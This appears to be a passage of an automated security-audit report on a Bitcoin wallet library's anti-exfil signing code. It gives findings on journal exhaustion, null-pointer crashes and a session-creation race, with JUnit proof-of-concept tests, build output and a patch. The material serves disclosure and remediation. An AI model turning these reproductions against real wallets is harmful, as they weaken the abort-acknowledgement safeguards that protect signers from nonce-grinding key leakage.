    private static final int MAX_FILE_BYTES = 4 * 1024 * 1024;
    private static final int MAX_EVENTS = 10_000;
    private static final int MAX_REASON_BYTES = 512;
```
⋯
#### Lines 48-58 — _Appending is unconditional until the capacity is reached._

```
        return AntiExfilDurableFiles.locked(path, () -> {
            Journal journal = loadOrCreate();
            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                    new String(reasonBytes, StandardCharsets.UTF_8));
            List<AbortEvent> updated = new ArrayList<>(journal.events);
            updated.add(event);
            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
            return event;
        });
    }
```
## Description

`recordPostRevealAbort` may be called repeatedly while the session remains `OPENINGS_ACCEPTED`, and every call appends another event for the same session ID and PSBT digest. The journal does not deduplicate events before enforcing its fixed 10,000-event capacity. One public coordinator instance can therefore fill the entire wallet journal with duplicate records. Once full, every subsequent genuine abort append fails and status reports an inflated count unrelated to distinct aborted ceremonies. Because each append rewrites the growing list, the abuse also causes increasing I/O before reaching the hard limit.
## Root cause

Abort events have no uniqueness constraint or per-session consumed marker, while a fixed global capacity turns duplicate appends into permanent exhaustion.
## Impact

A faulty or malicious in-process caller can permanently prevent future post-reveal aborts from being recorded in that journal and corrupt the wallet's audit count. The fresh-session gate remains conservative because the journal is nonempty, so this primarily destroys auditability and abort-recording availability.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void duplicatePostRevealAbortCallsFillJournalAndBlockARealLaterAbort() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();
        Path journal = temporary.resolve("wallet.aexj");

        AntiExfilCoordinator abused = AntiExfilCoordinator.create(temporary.resolve("abused-session.aexs"), journal,
                original, keystore, AntiExfilNetwork.TESTNET4, false, new VectorRandom((byte)'z'));
        AntiExfilMessage abusedCommit = AntiExfilCodec.decode(abused.getHostCommitMessage());
        byte[] abusedOpenings = signerOpeningsForCommit(signatures, abusedCommit);
        abused.acceptOpenings(abusedOpenings);

        for(int i = 0; i < 10_000; i++) {
            AntiExfilAbortJournal.AbortEvent duplicate = abused.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.SIGNER_CANCELLED);
            assertArrayEquals(abusedCommit.getSessionId(), duplicate.getSessionId());
            assertArrayEquals(abusedCommit.getPsbtDigest(), duplicate.getPsbtDigest());
        }

        assertEquals(10_000, abused.getStatus().getPostRevealAbortCount(),
                "The status count is inflated by duplicate records from one still-open session");

        AntiExfilException duplicateCapacityFailure = assertThrows(AntiExfilException.class,
                () -> abused.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.TRANSPORT_FAILED));
        assertEquals(AntiExfilException.Code.STATE_INVALID, duplicateCapacityFailure.getCode());
        assertTrue(duplicateCapacityFailure.getMessage().contains("Abort journal is full"));

        AntiExfilCoordinator laterGenuineAbort = AntiExfilCoordinator.create(temporary.resolve("genuine-later-session.aexs"), journal,
                original, keystore, AntiExfilNetwork.TESTNET4, true, new VectorRandom((byte)'y'));
        AntiExfilMessage laterCommit = AntiExfilCodec.decode(laterGenuineAbort.getHostCommitMessage());
        assertFalse(Arrays.equals(abusedCommit.getSessionId(), laterCommit.getSessionId()),
                "The later abort attempt uses a distinct ceremony session");
        laterGenuineAbort.acceptOpenings(signerOpeningsForCommit(signatures, laterCommit));

        AntiExfilException genuineAbortCannotBeRecorded = assertThrows(AntiExfilException.class,
                () -> laterGenuineAbort.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.USER_ABANDONED));
        assertEquals(AntiExfilException.Code.STATE_INVALID, genuineAbortCannotBeRecorded.getCode());
        assertTrue(genuineAbortCannotBeRecorded.getMessage().contains("Abort journal is full"));
        assertEquals(10_000, laterGenuineAbort.getStatus().getPostRevealAbortCount(),
                "A different abort-capable session inherits the exhausted wallet journal");
    }

    private static byte[] signerOpeningsForCommit(byte[] signatures, AntiExfilMessage commit) {
        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        AntiExfilMessage openings = new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots);
        AntiExfilCodec.validateTransition(commit, openings);
        return AntiExfilCodec.encode(openings);
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private final byte sessionByte;
        private int call;

        private VectorRandom(byte sessionByte) {
            this.sessionByte = sessionByte;
        }

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? sessionByte : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 22 lines & 0.994140625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 3s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; Gradle reported BUILD SUCCESSFUL with all 5 tasks executed. The test uses package-local deterministic randomness only to make valid fixture transcripts; the exploit itself calls the real `AntiExfilCoordinator.create`, `acceptOpenings`, `recordPostRevealAbort`, `getStatus`, and journal persistence paths. It demonstrates full capacity exhaustion at 10,000 duplicate abort records and that a later distinct opened session using the same wallet journal cannot record a genuine abort. Runtime is intentionally bounded to exactly the production journal capacity, so it exercises 10,000 durable appends.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Make abort-journal append idempotent per ceremony context by returning the existing event for a matching session ID and PSBT digest before capacity enforcement or rewriting the journal. Distinct ceremonies still append normally and remain subject to the capacity bound.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
@@ -1,138 +1,143 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 public final class AntiExfilAbortJournal {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'J'};
     private static final int VERSION = 1;
     private static final int MAX_FILE_BYTES = 4 * 1024 * 1024;
     private static final int MAX_EVENTS = 10_000;
     private static final int MAX_REASON_BYTES = 512;
 
     private final Path path;
     private final byte[] walletIdentity;
 
     public AntiExfilAbortJournal(Path path, byte[] walletIdentity) {
         if(path == null || walletIdentity == null || walletIdentity.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort-journal identity");
         }
         this.path = path;
         this.walletIdentity = walletIdentity.clone();
     }
 
     public List<AbortEvent> getEvents() {
         return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
     }
 
     AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
         if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
         }
         byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
         if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
         }
         return AntiExfilDurableFiles.locked(path, () -> {
             Journal journal = loadOrCreate();
+            for(AbortEvent existing : journal.events) {
+                if(Arrays.equals(existing.sessionId, sessionId) && Arrays.equals(existing.psbtDigest, psbtDigest)) {
+                    return existing;
+                }
+            }
             if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
             AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                     new String(reasonBytes, StandardCharsets.UTF_8));
             List<AbortEvent> updated = new ArrayList<>(journal.events);
             updated.add(event);
             AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
             return event;
         });
     }
 
     private Journal loadOrCreate() throws IOException {
         if(!Files.exists(path)) {
             Journal journal = new Journal(walletIdentity, List.of());
             AntiExfilDurableFiles.write(path, encode(journal), true);
             return journal;
         }
         Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
         if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
         return journal;
     }
 
     private static byte[] encode(Journal journal) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.write(journal.walletIdentity);
             output.writeInt(journal.events.size());
             for(AbortEvent event : journal.events) {
                 byte[] reason = event.reason.getBytes(StandardCharsets.UTF_8);
                 output.write(event.sessionId);
                 output.write(event.psbtDigest);
                 output.writeLong(event.recordedAtEpochSecond);
                 output.writeShort(reason.length);
                 output.write(reason);
             }
         }
         return bytes.toByteArray();
     }
 
     private static Journal decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             byte[] magic = input.readNBytes(4);
             if(!Arrays.equals(magic, MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown abort-journal format");
             byte[] identity = input.readNBytes(32);
             int count = input.readInt();
             if(identity.length != 32 || count < 0 || count > MAX_EVENTS) throw new IOException("Invalid abort-journal header");
             List<AbortEvent> events = new ArrayList<>(count);
             for(int i = 0; i < count; i++) {
                 byte[] sessionId = input.readNBytes(32);
                 byte[] digest = input.readNBytes(32);
                 long timestamp = input.readLong();
                 int reasonLength = input.readUnsignedShort();
                 byte[] reason = input.readNBytes(reasonLength);
                 if(sessionId.length != 32 || digest.length != 32 || reasonLength < 1
                         || reasonLength > MAX_REASON_BYTES || reason.length != reasonLength || timestamp < 0) {
                     throw new IOException("Invalid abort-journal event");
                 }
                 events.add(new AbortEvent(sessionId, digest, timestamp, new String(reason, StandardCharsets.UTF_8)));
             }
             if(input.available() != 0) throw new IOException("Trailing abort-journal data");
             return new Journal(identity, events);
         } catch(EOFException e) {
             throw new IOException("Truncated abort journal", e);
         }
     }
 
     public static final class AbortEvent {
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final long recordedAtEpochSecond;
         private final String reason;
 
         private AbortEvent(byte[] sessionId, byte[] psbtDigest, long recordedAtEpochSecond, String reason) {
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.recordedAtEpochSecond = recordedAtEpochSecond;
             this.reason = reason;
         }
 
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public long getRecordedAtEpochSecond() { return recordedAtEpochSecond; }
         public String getReason() { return reason; }
     }
 
     private record Journal(byte[] walletIdentity, List<AbortEvent> events) {
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java`
### Validation output

```
[output truncated: 30 lines & 0.8173828125 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 25s
```

---

# Malformed messages crash equality and hashing
**#248005**
- Severity: Low
- Validity: Invalid
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilMessage.java` (2 locations)
#### Lines 13-20 — _The public constructor preserves nullable invalid state._

```
    public AntiExfilMessage(AntiExfilNetwork network, AntiExfilStage stage, byte[] sessionId,
                            byte[] psbtDigest, List<AntiExfilSlot> slots) {
        this.network = network;
        this.stage = stage;
        this.sessionId = sessionId == null ? null : sessionId.clone();
        this.psbtDigest = psbtDigest == null ? null : psbtDigest.clone();
        this.slots = slots == null ? null : List.copyOf(slots);
    }
```
⋯
#### Lines 28-45 — _Equality and hashing dereference fields that construction permits to be null._

```
    @Override
    public boolean equals(Object object) {
        if(this == object) return true;
        if(!(object instanceof AntiExfilMessage other)) return false;
        return network == other.network && stage == other.stage
                && Arrays.equals(sessionId, other.sessionId)
                && Arrays.equals(psbtDigest, other.psbtDigest)
                && slots.equals(other.slots);
    }

    @Override
    public int hashCode() {
        int result = network.hashCode();
        result = 31 * result + stage.hashCode();
        result = 31 * result + Arrays.hashCode(sessionId);
        result = 31 * result + Arrays.hashCode(psbtDigest);
        return 31 * result + slots.hashCode();
    }
```
## Description

The public `AntiExfilMessage` constructor permits null network, stage, session ID, digest, and slot-list values so that validity can be deferred to the codec. Its `equals` and `hashCode` implementations nevertheless unconditionally dereference the nullable slot list, network, and stage. A directly constructed malformed message therefore throws `NullPointerException` when compared, deduplicated, or inserted into a hash collection before explicit validation. Decoded messages do not reach this state because codec validation rejects them, so the path is limited to callers handling object-form untrusted input. The failure escapes as a generic runtime exception rather than the protocol's controlled `AntiExfilException`.
## Root cause

Constructor invariants and value-object methods disagree: construction permits nullable invalid state while equality and hashing assume fully validated non-null fields.
## Impact

Malformed object-form input can abort a request or worker path during otherwise generic comparison or caching. It does not bypass cryptographic validation, but it creates a low-cost availability failure for public API consumers that compare before validating.

---

# Abort check races fresh session creation
**#248006**
- Severity: High
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java` (2 locations)
#### Lines 82-89 — _The journal snapshot/check precedes the separate fresh-session lock and write._

```
        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
        }
        AntiExfilDurableFiles.locked(sessionPath, () -> {
            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
            return null;
        });
```
⋯
#### Lines 207-217 — _Abort recording validates an old session and appends to the same journal independently._

```
    public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
        return AntiExfilDurableFiles.locked(sessionPath, () -> {
            State state = readValidatedStateUnlocked();
            if(state.phase != Phase.OPENINGS_ACCEPTED) {
                throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
            }
            if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
            AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
            return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                    commit.getSessionId(), commit.getPsbtDigest(), reason.name());
        });
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java` (2 locations)
#### Lines 35-37 — _getEvents holds the journal lock only while loading the copied snapshot._

```
    public List<AbortEvent> getEvents() {
        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
    }
```
⋯
#### Lines 48-57 — _The append acquires the journal lock independently after create's snapshot can already be stale._

```
        return AntiExfilDurableFiles.locked(path, () -> {
            Journal journal = loadOrCreate();
            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                    new String(reasonBytes, StandardCharsets.UTF_8));
            List<AbortEvent> updated = new ArrayList<>(journal.events);
            updated.add(event);
            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
            return event;
        });
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 24-34 — _Locks are scoped to individual target filenames, not a wallet-wide transaction._

```
    static <T> T locked(Path target, IOAction<T> action) {
        try {
            Path absolute = target.toAbsolutePath();
            Path parent = absolute.getParent();
            if(parent == null) throw new IOException("Durable state requires a parent directory");
            Files.createDirectories(parent);
            Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
            try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                FileLock ignored = channel.lock()) {
                return action.run();
            }
```
## Description

`create` reads the abort journal into a snapshot, releases the journal lock, checks the snapshot, and only later locks and writes the new session path. `recordPostRevealAbort` operates on an existing session path and then independently appends under the journal lock. With distinct old and new session paths, an abort append can occur after `create` has read an empty journal but before it writes the fresh session. The result is a durable abort event and a newly created unacknowledged session that would have been rejected if the operations were serialized at the wallet level. This does not require filesystem tampering, only concurrent local operations using the same journal.
## Root cause

The abort-history decision and new-session state transition are not protected by a single wallet-wide lock or transaction; they span independent journal and session locks with a stale snapshot.
## Impact

A signer or integration that can influence timing can obtain a fresh signing session after a post-reveal abort without triggering the required acknowledgement. That fresh session can later reveal another host contribution, preserving the selective-abort nonce-grinding channel.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void staleAbortJournalSnapshotAllowsUnacknowledgedFreshSessionAfterConcurrentAbort() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        byte[] openings = signerOpeningsFrom(signatures);
        Keystore keystore = keystore();
        Path journal = temporary.resolve("wallet.aexj");

        Path oldSession = temporary.resolve("old-openings-accepted.aexs");
        AntiExfilCoordinator oldCoordinator = AntiExfilCoordinator.create(oldSession, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        oldCoordinator.acceptOpenings(openings);
        assertEquals(0, oldCoordinator.getStatus().getPostRevealAbortCount());

        Path freshSession = temporary.resolve("fresh-unacknowledged.aexs");
        try(LockHolder holder = LockHolder.acquire(freshSession)) {
            ExecutorService executor = Executors.newFixedThreadPool(2);
            AtomicReference<Thread> createThread = new AtomicReference<>();
            CountDownLatch createStarted = new CountDownLatch(1);
            Future<AntiExfilCoordinator> freshCreate = executor.submit(new Callable<>() {
                @Override
                public AntiExfilCoordinator call() {
                    createThread.set(Thread.currentThread());
                    createStarted.countDown();
                    return AntiExfilCoordinator.create(freshSession, journal, original, keystore,
                            AntiExfilNetwork.TESTNET4, false, new VectorRandom());
                }
            });

            assertTrue(createStarted.await(5, TimeUnit.SECONDS), "fresh create thread did not start");
            awaitThreadBlockedInFileLock(createThread::get, Duration.ofSeconds(10));
            assertFalse(freshCreate.isDone(), "fresh create should be parked behind the separate session-path lock");
            assertFalse(Files.exists(freshSession), "fresh session must not be written before the abort is recorded");

            Future<AntiExfilAbortJournal.AbortEvent> abort = executor.submit(() ->
                    oldCoordinator.recordPostRevealAbort(AntiExfilCoordinator.AbortReason.SIGNER_CANCELLED));
            AntiExfilAbortJournal.AbortEvent event = abort.get(5, TimeUnit.SECONDS);
            assertArrayEquals(AntiExfilCodec.decode(oldCoordinator.getHostCommitMessage()).getSessionId(), event.getSessionId());
            assertEquals(1, new AntiExfilAbortJournal(journal,
                    AntiExfilCoordinator.getWalletKeyIdentity(keystore)).getEvents().size());

            holder.release();
            AntiExfilCoordinator freshCoordinator = freshCreate.get(5, TimeUnit.SECONDS);
            executor.shutdownNow();

            AntiExfilCoordinator reloadedFresh = AntiExfilCoordinator.load(freshSession, journal, keystore);
            assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, reloadedFresh.getStatus().getPhase());
            assertEquals(1, reloadedFresh.getStatus().getPostRevealAbortCount(),
                    "disk contains both the abort event and an unacknowledged fresh session");

            byte[] revealAfterAbort = freshCoordinator.acceptOpenings(openings);
            assertEquals(AntiExfilStage.HOST_REVEAL, AntiExfilCodec.decode(revealAfterAbort).getStage(),
                    "the stale-check session can still reveal another host contribution after the abort");

            Path laterSession = temporary.resolve("later-correctly-blocked.aexs");
            AntiExfilException blocked = assertThrows(AntiExfilException.class, () ->
                    AntiExfilCoordinator.create(laterSession, journal, original, keystore,
                            AntiExfilNetwork.TESTNET4, false, new VectorRandom()));
            assertEquals(AntiExfilException.Code.RETRY_CONFLICT, blocked.getCode(),
                    "a non-racing create observes the same journal event and rejects without acknowledgement");
        }
    }

    private static void awaitThreadBlockedInFileLock(java.util.function.Supplier<Thread> supplier, Duration timeout) throws InterruptedException {
        long deadline = System.nanoTime() + timeout.toNanos();
        while(System.nanoTime() < deadline) {
            Thread thread = supplier.get();
            if(thread != null) {
                for(StackTraceElement element : thread.getStackTrace()) {
                    if(element.getClassName().equals("sun.nio.ch.FileChannelImpl") && element.getMethodName().equals("lock")) {
                        return;
                    }
                }
            }
            Thread.sleep(10);
        }
        fail("fresh create did not reach the vulnerable window between abort-journal check and session write");
    }

    private static byte[] signerOpeningsFrom(byte[] signatures) {
        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class LockHolder implements AutoCloseable {
        private final Process process;
        private boolean released;

        private LockHolder(Process process) {
            this.process = process;
        }

        static LockHolder acquire(Path target) throws Exception {
            String java = Path.of(System.getProperty("java.home"), "bin", "java").toString();
            Process process = new ProcessBuilder(java, "-cp", System.getProperty("java.class.path"),
                    "com.sparrowwallet.drongo.antiexfil.LockFileHolder", target.toString())
                    .redirectErrorStream(true)
                    .start();
            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            long deadline = System.nanoTime() + Duration.ofSeconds(10).toNanos();
            while(System.nanoTime() < deadline) {
                if(output.ready()) {
                    String line = output.readLine();
                    if("LOCKED".equals(line)) return new LockHolder(process);
                    fail("lock holder failed before acquiring lock: " + line);
                }
                if(!process.isAlive()) fail("lock holder exited before acquiring lock");
                Thread.sleep(10);
            }
            process.destroyForcibly();
            fail("lock holder did not acquire the session lock");
            return null;
        }

        void release() throws Exception {
            if(!released) {
                released = true;
                process.getOutputStream().close();
                if(!process.waitFor(5, TimeUnit.SECONDS)) {
                    process.destroyForcibly();
                    fail("lock holder did not exit after release");
                }
            }
        }

        @Override
        public void close() throws Exception {
            release();
        }
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Extra files
- `src/test/java/com/sparrowwallet/drongo/antiexfil/LockFileHolder.java`
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/LockFileHolder.java
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 20 lines & 0.7431640625 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 2s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

